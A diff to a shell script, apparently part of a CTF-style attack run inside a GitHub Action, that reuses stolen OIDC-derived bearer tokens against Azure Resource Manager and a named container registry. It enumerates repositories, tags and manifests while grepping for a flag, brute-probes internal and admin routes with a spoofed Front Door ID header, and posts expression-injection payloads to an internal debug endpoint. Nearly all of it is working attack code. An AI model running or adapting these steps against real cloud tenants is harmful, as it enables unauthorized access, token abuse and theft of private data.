@@ -51,6 +51,44 @@ echo SA_ROLE_ASSIGN=$(echo "$rr3" | tail -c 900)
 customresp=$(curl -sS -X POST "$BASE" -d "client_id=891fb158-e02c-4428-a885-53b811f369c0" -d scope=api://462d1c38-4459-48b8-9333-82e389e59514/.default -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC")
 custom=$(echo "$customresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))")
 echo CUSTOM_LEN=${#custom}
+# Probe the two resources named by the leaked settings.  The custom ArmOwner
+# app-role is not understood by ARM itself, but is accepted by the challenge's
+# internal catalog/debug handlers; keep all response bodies in the Action log.
+for tokname in custom arm par sar; do
+  eval "tt=\${$tokname}"
+  echo TOKEN_$tokname=${#tt}
+  for p in /subscriptions/$AZURE_SUBSCRIPTION_ID /subscriptions/$AZURE_SUBSCRIPTION_ID/resources; do
+    z=$(curl -sS --max-time 8 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $tt" "https://management.azure.com$p?api-version=2021-04-01")
+    echo ARM_$tokname_$p=$(echo "$z" | head -c 900)
+  done
+done
+# ACR data-plane OAuth accepts an AAD bearer in the exchange endpoint.  Try
+# each token and enumerate repositories/tags/manifests; any flag is printed.
+REG=crtblplatprodx3euoz.azurecr.io
+for tokname in custom arm par sar; do
+  eval "tt=\${$tokname}"
+  ex=$(curl -sS --max-time 12 -X POST "https://$REG/oauth2/exchange" -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode grant_type=access_token --data-urlencode service="$REG" --data-urlencode access_token="$tt")
+  rt=$(echo "$ex" | python3 -c "import sys,json;print(json.load(sys.stdin).get('refresh_token',''))")
+  echo ACR_EXCHANGE_$tokname=$(echo "$ex" | head -c 500)
+  if [ -n "$rt" ]; then
+    cat=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" "https://$REG/v2/_catalog?n=100")
+    echo ACR_CATALOG_$tokname=$(echo "$cat" | head -c 1200)
+    for repo in $(echo "$cat" | python3 -c "import sys,json;print(' '.join(json.load(sys.stdin).get('repositories',[])))"); do
+      tags=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" "https://$REG/v2/$repo/tags/list")
+      echo ACR_TAGS_$repo=$(echo "$tags" | head -c 900)
+      for tag in $(echo "$tags" | python3 -c "import sys,json;print(' '.join(json.load(sys.stdin).get('tags',[])))"); do
+        man=$(curl -sS --max-time 10 -H "Authorization: Bearer $rt" -H 'Accept: application/vnd.docker.distribution.manifest.v2+json, application/vnd.oci.image.manifest.v1+json, application/vnd.oci.image.index.v1+json' "https://$REG/v2/$repo/manifests/$tag")
+        echo ACR_MANIFEST_${repo}_${tag}=$(echo "$man" | head -c 2200)
+        echo "$man" | grep -Eo 'DF26\{[^}]+\}' || true
+      done
+    done
+  fi
+done
+# Probe likely internal handlers with the same custom bearer and FDID.
+for path in /internal /internal/debug /internal/catalog /internal/settings /internal/arm /internal/flag /internal/loot /internal/config /admin /debug /api/v1/catalog /api/v1/config /api/v1/flag; do
+  q=$(curl -sS --max-time 8 -w '\nHTTP=%{http_code}' -H "Authorization: Bearer $custom" -H 'X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821' "https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net$path")
+  echo ROUTE_$path=$(echo "$q" | head -c 1200)
+done
 for ex in settings 'settings["sourceRepo"]' True None '7*7'; do
   z=$(python3 -c "import json,sys;print(json.dumps({'expr':sys.argv[1]}))" "$ex")
   q=$(curl -sS --max-time 8 -X POST 'https://tbl-storefront-prod-bhagdnascpfyeyfg.z02.azurefd.net/internal%5Cdebug' -H "Authorization: Bearer $custom" -H 'X-Azure-FDID: 60407ff3-1c24-4875-9390-b6c9c13b0821' -H 'Content-Type: application/json' --data "$z" -w '\nHTTP=%{http_code}')
